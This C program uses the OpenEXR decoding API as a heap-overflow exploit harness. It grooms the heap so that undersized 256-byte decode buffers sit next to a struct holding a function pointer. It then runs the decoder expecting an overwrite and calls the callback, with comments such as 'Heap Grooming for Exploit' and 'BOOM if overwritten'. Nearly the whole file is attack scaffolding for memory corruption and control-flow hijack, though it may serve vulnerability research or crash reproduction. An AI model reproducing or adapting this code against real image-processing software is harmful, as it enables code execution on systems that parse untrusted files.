
#include <openexr_context.h>
#include <openexr_part.h>
#include <openexr_decode.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void error_handler(exr_const_context_t f, int code, const char* msg) {
    fprintf(stderr, "EXR Error (%d): %s\n", code, msg);
}

void cleanup() {
    printf("Safe cleanup executed.\n");
}

typedef struct {
    char padding[16];
    void (*callback)();
} UnsuspectingVictim;

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <exr_file>\n", argv[0]);
        return 1;
    }
    
    exr_context_t f;
    exr_context_initializer_t cinit = EXR_DEFAULT_CONTEXT_INITIALIZER;
    cinit.error_handler_fn = error_handler;
    
    exr_result_t rv = exr_start_read(&f, argv[1], &cinit);
    if (rv != EXR_ERR_SUCCESS) {
        printf("Failed to open file\n");
        return 1;
    }
    
    int part = 0;
    exr_attr_box2i_t datawin;
    if (exr_get_data_window(f, part, &datawin) != EXR_ERR_SUCCESS) {
        printf("Failed to get data window\n");
        return 1;
    }
    
    int width = datawin.max.x - datawin.min.x + 1;
    int height = datawin.max.y - datawin.min.y + 1;
    
    int lines_per_chunk;
    if (exr_get_scanlines_per_chunk(f, part, &lines_per_chunk) != EXR_ERR_SUCCESS) {
        lines_per_chunk = 1; 
    }
    
    printf("Processing image %dx%d, lines per chunk: %d\n", width, height, lines_per_chunk);

    exr_decode_pipeline_t decoder = EXR_DECODE_PIPELINE_INITIALIZER;
    
    for (int y = datawin.min.y; y <= datawin.max.y; y += lines_per_chunk) {
        exr_chunk_info_t cinfo = {0};
        rv = exr_read_scanline_chunk_info(f, part, y, &cinfo);
        if (rv != EXR_ERR_SUCCESS) {
            printf("Failed to get chunk info for y=%d\n", y);
            continue;
        }
        
        rv = exr_decoding_initialize(f, part, &cinfo, &decoder);
        if (rv != EXR_ERR_SUCCESS) {
            printf("Failed to init decoding for y=%d\n", y);
            continue;
        }
        
        rv = exr_decoding_choose_default_routines(f, part, &decoder);
        if (rv != EXR_ERR_SUCCESS) {
            printf("Failed to choose routines for y=%d\n", y);
            continue;
        }
        
        // Heap Grooming for Exploit
        // We want: [DecodeBuffer] [VictimStruct]
        // Vulnerability: DecodeBuffer overflows into VictimStruct
        
        #define DECODE_BUF_SIZE 256
        
        // We need to keep pointers to free them / or keep them alive
        void* chunks_mem[10];

        for (int c = 0; c < decoder.channel_count; c++) {
             // Allocate vulnerable buffer
             decoder.channels[c].decode_to_ptr = malloc(DECODE_BUF_SIZE);
             
             // Allocate victim immediately after
             UnsuspectingVictim* victim = (UnsuspectingVictim*)malloc(sizeof(UnsuspectingVictim));
             victim->callback = cleanup;
             
             // Save for access
             chunks_mem[c] = (void*)victim; 
             
             decoder.channels[c].user_pixel_stride = 4; 
             decoder.channels[c].user_line_stride = width * 4; 
             decoder.channels[c].user_bytes_per_element = 4;
        }

        printf("Running decode for y=%d... (Expecting overwrite)\n", y);
        rv = exr_decoding_run(f, part, &decoder);
        
        // Check if victim is corrupted
        for (int c = 0; c < decoder.channel_count; c++) {
             UnsuspectingVictim* v = (UnsuspectingVictim*)chunks_mem[c];
             printf("Checking victim %d callback at %p...\n", c, v->callback);
             v->callback(); // BOOM if overwritten
             free(v);
        }
        
        // Cleanup this chunk's buffers
        for (int c = 0; c < decoder.channel_count; c++) {
            free(decoder.channels[c].decode_to_ptr);
        }
        exr_decoding_destroy(f, &decoder);
    }
    
    exr_finish(&f);
    printf("Finished processing.\n");
    return 0;
}
